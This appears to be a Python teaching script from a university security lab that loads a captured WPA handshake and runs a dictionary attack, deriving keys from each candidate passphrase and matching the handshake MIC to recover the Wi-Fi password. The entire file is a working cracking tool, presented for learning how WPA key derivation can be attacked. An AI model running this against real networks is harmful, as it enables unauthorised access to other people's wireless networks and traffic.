#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__     = "GPL"
__version__     = "1.0"
__email__       = "abraham.rubinstein@heig-vd.ch"
__status__      = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0].info
APmac       = a2b_hex(str.replace(wpa[5].addr2, ":", ""))
Clientmac   = a2b_hex(str.replace(wpa[5].addr1, ":", ""))

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(b2a_hex(wpa[5].load)[26:90])
SNonce      = a2b_hex(b2a_hex(wpa[6].load)[26:90])

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_wanted = wpa[8].load[-18:-2]


B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

ea = wpa[8][EAPOL] # On recupere la couche EAPOL de la trame
data =  hex(ea.version)[2:].zfill(2)
data += hex(ea.type)[2:].zfill(2)
data += hex(ea.len)[2:].zfill(4)
data += (wpa[8].load[:-18]).hex()
data += '0' * 32 
data += (wpa[8].load[-2:]).hex()
data = a2b_hex(data)


currentMic = ""
#dictionnary = open("dictionnary", "r")
currentPass = ""
#print("MIC WANTED " + mic_wanted)
with open('dictionnary') as dictionnary:
    for currentPass in dictionnary:
        currentPass = currentPass[:-1] # On enleve le \n
        currentPass = str.encode(currentPass)
        pmk = pbkdf2(hashlib.sha1,currentPass, ssid, 4096, 32)
        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)
        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)
        mic = mic.hexdigest()[0:32]
        if(mic == mic_wanted.hex()):
            print("Passphrase found : " + currentPass.decode("utf-8"))
            exit(1)

